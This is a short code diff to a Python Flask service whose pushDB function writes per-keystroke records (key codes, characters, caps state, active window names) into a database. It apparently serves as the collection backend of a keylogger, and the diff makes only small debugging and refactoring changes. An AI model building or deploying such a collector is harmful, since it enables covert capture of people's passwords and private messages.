@@ -36,10 +36,12 @@ def addLog():
     # processedKey = data[key]['processedKey']
   
     try:
-      self.pushDB(data[key])
+      print(data[key])
+      pushDB(data[key])
 
     except Exception as e:
-      print(e)
+      print("Exception:",e)
+
       return make_response(jsonify({'response': 'Fail', 'code':500}), 500)
   
   return make_response(jsonify({'response': 'Success', 'code':200}), 200)
@@ -56,7 +58,7 @@ def pushDB(payload):
     database=main_cfg['db']
   )
   
-  mycursor = mydb.cursor()
+  mycursor = db.cursor()
   
   sql = f"INSERT INTO {main_cfg['dbTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
   val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
@@ -64,7 +66,7 @@ def pushDB(payload):
   mycursor.execute(sql, val)
   db.commit()
   print(mycursor.rowcount, "it worked!!!")
-
+  return 0 
 
 
 if __name__ == "__main__":
